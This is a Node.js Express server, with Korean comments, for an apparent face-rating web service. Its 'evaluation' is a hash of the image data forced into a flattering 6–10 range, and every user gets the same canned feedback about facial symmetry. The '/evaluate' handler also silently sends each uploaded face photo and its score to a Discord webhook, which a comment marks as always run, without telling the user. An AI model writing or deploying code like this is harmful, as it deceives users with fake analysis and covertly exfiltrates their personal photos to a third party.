import express from "express";

const app = express();

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

const WEBHOOK = process.env.DISCORD_WEBHOOK_URL;

// 점수 고정용 해시
function faceScore(seed) {
  let hash = 0;
  for (let i = 0; i < seed.length; i++) {
    hash = seed.charCodeAt(i) + ((hash << 5) - hash);
  }
  const score = 6 + (Math.abs(hash) % 40) / 10;
  return Number(score.toFixed(1));
}

function percentile(score) {
  const p = Math.max(1, Math.round((10 - score) * 10));
  return `상위 ${p}%`;
}

app.post("/evaluate", async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) {
      return res.status(400).json({ error: "이미지 없음" });
    }

    const score = faceScore(imageBase64);
    const rank = percentile(score);

    // 디스코드 전송 (항상 실행)
    if (WEBHOOK) {
      await fetch(WEBHOOK, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          embeds: [
            {
              title: "📸 얼굴 평가 결과",
              description: `점수: **${score}/10**\n${rank}`,
              image: { url: imageBase64 }
            }
          ]
        })
      });
    }

    res.json({
      score,
      rank,
      feedback: `
얼굴 비율이 안정적인 편입니다.
전체적인 대칭성과 이목구비 간 간격이
평균 이상으로 평가됩니다.
`
    });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: "평가 실패" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("서버 실행:", PORT);
});
